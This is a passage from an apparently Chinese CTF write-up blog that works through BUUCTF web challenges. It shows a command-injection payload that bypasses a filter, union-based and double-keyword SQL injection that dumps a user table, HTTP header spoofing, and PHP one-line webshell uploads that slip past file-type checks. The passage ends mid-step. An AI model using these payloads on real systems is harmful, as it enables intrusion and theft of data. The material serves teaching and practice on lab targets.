double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿‡æ»¤äº†flag</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="payloadï¼š-1"><a href="#payloadï¼š-1" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><p><code>?ip=127.0.0.1;ls;a=g;b=fla;cat$IFS$b$a.php</code></p><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p><strong>ps: å‚æ•°é¡ºåºè¦æ³¨æ„ï¼Œbaæ¢ä½abï¼Œflagä¼šè¢«æ£€æµ‹å‡ºæ¥ï¼šï¼‰</strong></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%7B%22request_id%22:%22165208109616782391838497%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165208109616782391838497&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-104297163-null-null.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BGXYCTF2019%5DPing+Ping+Ping+1&spm=1018.2226.3001.4187">ctf ping å‘½ä»¤æ‰§è¡Œ</a></p><h1 id="8ã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL1"><a href="#8ã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL1" class="headerlink" title="8ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL1"></a>8ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL1</h1><h2 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h2><blockquote><p>è¿™ç¾¤è¯¥æ­»çš„é»‘å®¢ï¼Œç«Ÿç„¶è¿™ä¹ˆå¿«å°±æ‰¾åˆ°äº†æˆ‘çš„flag,è¿™æ¬¡æˆ‘æŠŠå®ƒä»¬æ”¾åœ¨äº†é‚£ä¸ªåœ°æ–¹ï¼Œå“¼å“¼ï¼</p><p>ç”¨æˆ·åï¼š</p><p>å¯†  ç ï¼š                            </p><p>Syclover @ cl4y</p></blockquote><h2 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h2><p>1.åˆ¤æ–­æ³¨å…¥ç‚¹ï¼š<code>1&#39; or 1=1#</code> å¾—åˆ°å›æ˜¾ï¼š</p><blockquote><p>è·³è½¬åˆ°äº†check.phpé¡µé¢ã€‚å¹¶å¾—åˆ°äº†ç”¨æˆ·åå’Œå¯†ç ï¼š</p><h1 id="Login-Success"><a href="#Login-Success" class="headerlink" title="Login Success!"></a>Login Success!</h1><p>Hello adminï¼</p><p>Your password is â€˜be53a02c355072e2ef4eaa93c02c9ffbâ€™</p></blockquote><p>2.å°è¯•å¯†ç <a href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>è§£å¯†å¤±è´¥ï¼Œè¿˜æ˜¯å›åˆ°æ³¨å…¥çš„æ€è·¯ä¸Šï¼ŒæŸ¥è¯¢å­—æ®µæ•°ï¼š<br>åœ¨urlä¸­è¾“å…¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' order by 3%23&amp;password=1     å­˜åœ¨/check.php?username=admin'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>     æŠ¥é”™<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>æ³¨æ„ï¼šæ­¤æ—¶æ˜¯åœ¨urlä¸­è¾“å…¥çš„ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨#ï¼Œè€Œç”¨å…¶urlç¼–ç %23ã€‚</strong></p><p>3.ç”¨<code>union</code>æŸ¥è¯¢æµ‹è¯•æ³¨å…¥ç‚¹ï¼ˆå›æ˜¾ç‚¹ä½ï¼‰ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h1 id="Login-Success-1"><a href="#Login-Success-1" class="headerlink" title="Login Success!"></a>Login Success!</h1><p>Hello 2ï¼</p><p>Your password is â€˜3â€™</p></blockquote><p>4.å¾—åˆ°å›æ˜¾ç‚¹ä½ä¸º2å’Œ3ï¼ŒæŸ¥è¯¢å½“å‰æ•°æ®åº“ååŠç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello geekï¼</p><p>Your password is â€˜10.3.18-MariaDBâ€™</p></blockquote><p>5.çˆ†è¡¨ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello 2ï¼</p><p>Your password is â€˜geekuser,l0ve1ysq1â€™</p></blockquote><p>6.çŒœæµ‹ä¸ºï¼š<code>l0ve1ysq1</code>è¿™ä¸ªè¡¨ï¼š<br>çˆ†å­—æ®µï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>l0ve1ysq1'<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello 2ï¼</p><p>Your password is â€˜id,username,passwordâ€™</p></blockquote><p>7.çˆ†æ•°æ®ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello 2ï¼</p><p>Your password is  â€˜1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{d9614f96-0272-4d9d-a8e4-de936e0cd958}â€™</p></blockquote><p>å¾—åˆ°flagï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">flag&#123;d9614f96<span class="token operator">-</span><span class="token number">0272</span><span class="token operator">-</span><span class="token number">4</span>d9d<span class="token operator">-</span>a8e4<span class="token operator">-</span>de936e0cd958&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="9ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Knife1"><a href="#9ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Knife1" class="headerlink" title="9ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife1"></a>9ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife1</h1><h2 id="é¢˜ç›®æè¿°ï¼š-1"><a href="#é¢˜ç›®æè¿°ï¼š-1" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h2><blockquote><h1 id="æˆ‘å®¶èœåˆ€ä¸¢äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‰¾ä¸€ä¸‹ä¹ˆ"><a href="#æˆ‘å®¶èœåˆ€ä¸¢äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‰¾ä¸€ä¸‹ä¹ˆ" class="headerlink" title="æˆ‘å®¶èœåˆ€ä¸¢äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‰¾ä¸€ä¸‹ä¹ˆ"></a>æˆ‘å®¶èœåˆ€ä¸¢äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‰¾ä¸€ä¸‹ä¹ˆ</h1><p>eval($_POST[â€œSycâ€]);</p></blockquote><p>è¯¶ï¼Œæ„Ÿè§‰è¿™ä¸ªæˆ‘ä¼šå“‡ï¼Œå¯æ˜¯æˆ‘æ²¡æœ‰èœåˆ€å“ˆå“ˆï¼Œä¸çŸ¥é“æˆ‘ä»…æœ‰çš„èšå‰‘æœ‰æ²¡æœ‰ç¼˜åˆ†è§åˆ°flag</p><h2 id="æ€è·¯ï¼š-1"><a href="#æ€è·¯ï¼š-1" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h2><p>bpæŠ“åŒ…ï¼Œpostä¼ å…¥ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"Syc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç®€ç®€å•å•ï¼šåœ¨æœ€å‰é¢çš„ç›®å½•ä¸­â€”-&gt;flag</p><h1 id="10ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Http1"><a href="#10ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Http1" class="headerlink" title="10ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http1"></a>10ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http1</h1><h2 id="çŸ¥è¯†ç‚¹æ¦‚æ‹¬ï¼š"><a href="#çŸ¥è¯†ç‚¹æ¦‚æ‹¬ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹æ¦‚æ‹¬ï¼š"></a>çŸ¥è¯†ç‚¹æ¦‚æ‹¬ï¼š</h2><blockquote><ol><li>Refererï¼šRefereræ˜¯<a href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>çš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨ç±æ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ã€‚â€</li><li>UAï¼ˆUser Agentï¼‰ï¼šâ€œuser agentæ˜¯æŒ‡ç”¨æˆ·ä»£ç†,ç®€ç§° UAã€‚ ä½œç”¨:ä½¿æœåŠ¡å™¨èƒ½å¤Ÿè¯†åˆ«å®¢æˆ·ä½¿ç”¨çš„æ“ä½œç³»ç»ŸåŠç‰ˆæœ¬ã€CPU ç±»å‹ã€æµè§ˆå™¨åŠç‰ˆæœ¬ã€æµè§ˆå™¨æ¸²æŸ“å¼•æ“ã€æµè§ˆå™¨è¯­è¨€ã€æµè§ˆå™¨æ’ä»¶ç­‰ã€‚ ï¼ˆæ¦‚æ‹¬ï¼šä¸€èˆ¬è®¿é—®æµè§ˆå™¨çš„åå­—éƒ½ä¼šè®¾ç½®åœ¨UAï¼‰</li><li>X-Forwarded-For ï¼š HTTP æ‰©å±•å¤´éƒ¨ã€‚æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡<a href="https://baike.baidu.com/item/HTTP">HTTP</a><a href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86">ä»£ç†</a>æˆ–<a href="https://baike.baidu.com/item/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">è´Ÿè½½å‡è¡¡</a>æ–¹å¼è¿æ¥åˆ°<a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8">WebæœåŠ¡å™¨</a>çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IPåœ°å€</a>çš„HTTPè¯·æ±‚å¤´å­—æ®µã€‚</li></ol></blockquote><h2 id="ç¯å¢ƒæè¿°ï¼š"><a href="#ç¯å¢ƒæè¿°ï¼š" class="headerlink" title="ç¯å¢ƒæè¿°ï¼š"></a>ç¯å¢ƒæè¿°ï¼š</h2><blockquote><p>é¡µé¢ä¸­æ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿ï¼Œäºæ˜¯F12æŸ¥çœ‹æºç ï¼Œå‘ç°ï¼š</p><p><code>href=&quot;Secret.php&quot;</code></p></blockquote><p>è®¿é—®è·³è½¬é¡µé¢ï¼š</p><blockquote><p>å¾—åˆ°ï¼š</p><p><code>It doesn&#39;t come from &#39;https://Sycsecret.buuoj.cn&#39;</code></p><p>æ­¤æ—¶æƒ³åˆ°ï¼šé¢˜ç›®æè¿°æ˜¯HTTPï¼ˆè¯·æ±‚å¤´ä¼ªé€ ï¼Ÿï¼‰</p></blockquote><h2 id="hacbaræ„é€ payload"><a href="#hacbaræ„é€ payload" class="headerlink" title="hacbaræ„é€ payload"></a>hacbaræ„é€ payload</h2><blockquote><ol><li>æ„é€ ï¼šReferer:<a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></li><li>æç¤ºï¼š<code>Please use &quot;Syclover&quot; browser</code></li><li>æ„é€ ï¼š<code>User Agent: Syclover</code></li><li>æç¤ºï¼šNo!!! you can only read this locally!!!</li><li>æ„é€ ï¼š<code>X-Forwarded-For: 127.0.0.1</code></li><li>å¾—åˆ°flagï¼š<code>flag&#123;54d0092a-e344-464a-b1b8-7a179015c8f6&#125;</code></li></ol></blockquote><h2 id="BPæŠ“åŒ…ä¿®æ”¹HTTPè¯·æ±‚å¤´"><a href="#BPæŠ“åŒ…ä¿®æ”¹HTTPè¯·æ±‚å¤´" class="headerlink" title="BPæŠ“åŒ…ä¿®æ”¹HTTPè¯·æ±‚å¤´"></a>BPæŠ“åŒ…ä¿®æ”¹HTTPè¯·æ±‚å¤´</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Secret.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">node4.buuoj.cn:26365</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Syclover</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://Sycsecret.buuoj.cn</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ³¨æ„ï¼šæ„é€ çš„è¯·æ±‚å¤´ä¸­ï¼Œæ¯ä¸€ä¸ªå‚æ•°åéœ€è¦ç©ºæ ¼</p></blockquote><h1 id="11ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload1"><a href="#11ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload1" class="headerlink" title="11ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload1"></a>11ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload1</h1><h2 id="ç¯å¢ƒæè¿°ï¼š-1"><a href="#ç¯å¢ƒæè¿°ï¼š-1" class="headerlink" title="ç¯å¢ƒæè¿°ï¼š"></a>ç¯å¢ƒæè¿°ï¼š</h2><blockquote><p>æ–‡ä»¶ä¸Šä¼ æ¡†ï¼Œæç¤ºç±»å‹ä¸ºå›¾ç‰‡</p><hr></blockquote><blockquote><p>éšä¾¿æäº¤ä¸€ä¸ªï¼š</p><p>è¿”å›ï¼šNOT imageï¼</p></blockquote><h2 id="BPæŠ“åŒ…"><a href="#BPæŠ“åŒ…" class="headerlink" title="BPæŠ“åŒ…"></a>BPæŠ“åŒ…</h2><blockquote><p>å°†Content-Typeé‡Œé¢çš„æ ¼å¼æ”¹ä¸º==image/jpeg==</p><p>postä¼ å‚ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š</p><p><code>&lt;?php **eval**(@$_POST[&#39;1&#39;]);?&gt;</code></p><p>è¿”å›ï¼š<strong>NOTï¼php!</strong></p></blockquote><h2 id="è¿‡æ»¤åç¼€"><a href="#è¿‡æ»¤åç¼€" class="headerlink" title="è¿‡æ»¤åç¼€"></a>è¿‡æ»¤åç¼€</h2><blockquote><p>å¸¸è§ç»•è¿‡åç¼€çš„æœ‰æ–‡ä»¶æ ¼å¼æœ‰ï¼šphp,php3,php4,php5,phtml.pht</p></blockquote><blockquote><p>è¿™é‡Œphtmlå¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯è¿”å›ï¼š<br>`NO! HACKER! your file included â€˜&lt;?â€™</p></blockquote><h2 id="æ¢ä¸€å¥æœ¨é©¬"><a href="#æ¢ä¸€å¥æœ¨é©¬" class="headerlink" title="æ¢ä¸€å¥æœ¨é©¬"></a>æ¢ä¸€å¥æœ¨é©¬</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æˆåŠŸç»•è¿‡</p><h2 id="èšå‰‘è¿æ¥"><a href="#èšå‰‘è¿æ¥" class="headerlink" title="èšå‰‘è¿æ¥"></a>èšå‰‘è¿æ¥</h2><blockquote><p>çŒœæµ‹è·¯å¾„ä¸º  </p><p><code>http://432fcfb5-9ceb-4e54-9cb2-1eeabd3b10a6.node4.buuoj.cn:81/upload/aWord1.phtml</code></p></blockquote><p>å¯†ç ï¼š</p><blockquote><p><code>shell</code></p></blockquote><p>æ ¹ç›®å½•ä¸‹å¾—åˆ°flagæ–‡ä»¶</p><h1 id="12ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload1"><a href="#12ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload1" class="headerlink" title="12ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload1"></a>12ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload1</h1><h2 id="ç¯å¢ƒæè¿°"><a href="#ç¯å¢ƒæè¿°" class="headerlink" title="ç¯å¢ƒæè¿°"></a>ç¯å¢ƒæè¿°</h2><blockquote><p>æ–‡ä»¶ä¸Šä¼ </p></blockquote><p>è¦æ±‚æ ¼å¼ä¸ºï¼š</p><p>è€ƒè™‘ï¼šä¸Šä¼ ä¸€å¥è¯æœ¨é©¬åå‘ç°ä»–æœ‰ä¸€ä¸ªç™½åå•ï¼Œåªèƒ½ä¸Šä¼ ä»¥è¿™ä¸ªç»“å°¾çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†åç¼€ä¿®æ”¹ä¸ºpngä¸Šä¼ ï¼Œå†ç”¨bp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">æŠ“åŒ…</a>å†æ”¹ä¸ºphtmlå°±å¥½</p><p>å’Œä¸Šä¸€é¢˜æ€è·¯å¤§è‡´</p><h2 id="BPæŠ“åŒ…ä¿®æ”¹"><a href="#BPæŠ“åŒ…ä¿®æ”¹" class="headerlink" title="BPæŠ“åŒ…ä¿®æ”¹"></a>BPæŠ“åŒ…ä¿®æ”¹</h2><blockquote><p>`Content-Type: image/png</p><?php eval(@$_POST['1']);?><p>`</p></blockquote><p>è¿”å›ï¼š</p><blockquote><p><code>Upload Success! Look here~ ./uplo4d/11b327e23e72bfb7bf0cc8c9d098384d.phtml</code></p></blockquote><p>æ„é€ èšå‰‘é“¾æ¥</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//d2dbf14f-ace8-4c2a-a53d-55ffd313eb12.node4.buuoj.cn:81/uplo4d/11b327e23e72bfb7bf0cc8c9d098384d.phtml</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><blockquote><ol><li>è¿™ä¸€é¢˜å¥½åƒåœ¨å‰ç«¯å°±è¿›è¡Œäº†æ–‡ä»¶æ ¼å¼è¿‡æ»¤ï¼ŒçŒœæµ‹åœ¨jsä¸­è¿›è¡Œåˆ¤æ–­ï¼Œå°è¯•å¯»æ‰¾jsâ€”â€“&gt;å¤±è´¥</li><li>åªèƒ½BPæŠ“åŒ…ä¿®æ”¹åç¼€ç±»å‹äº†</li></ol></blockquote><h1 id="13ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#13ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="13ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>13ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h1><h2 id="ç¯å¢ƒæè¿°-1"><a href="#ç¯å¢ƒæè¿°-1" class="headerlink" title="ç¯å¢ƒæè¿°"></a>ç¯å¢ƒæè¿°</h2><blockquote><p>usernameã€passwdæ¡†</p></blockquote><p><code>åº”è¯¥ä¸ºæ³¨å…¥ç‚¹</code></p><p>1&gt;</p><pre class="line-numbers language-none"><code class="language-none">?username&#x3D;11&#39;&amp;password&#x3D;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿”å›ï¼š</p><blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MariaDB server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'22'</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>2&gt;</p><p>order by åˆ¤æ–­åˆ—æ•°<code>11&#39; order by 4#</code></p><p>å‘ç°order by è¢«è¿‡æ»¤</p><p>è¿”å›</p><blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'der 4#'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'22'</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>unionã€or\where\selectä¹Ÿè¢«è¿‡æ»¤</p></blockquote><p>3&gt;åˆ¤æ–­å›æ˜¾ä½</p><p>æ–°èŠå£«ï¼šå…³é”®å­—åŒå†™ç»•è¿‡ï¼ˆçŒœæµ‹åªè¿‡æ»¤ä¸€æ¬¡ï¼‰</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">15</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>è¿”å›</p><pre class="line-numbers language-sql'" data-language="sql'"><code class="language-sql'">Hello 3ï¼Your password is &#39;4&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p>4&gt;æŸ¥æ•°æ®åº“</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">11</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿”å›</p><blockquote><p>`Hello 2ï¼</p><p>Your password is 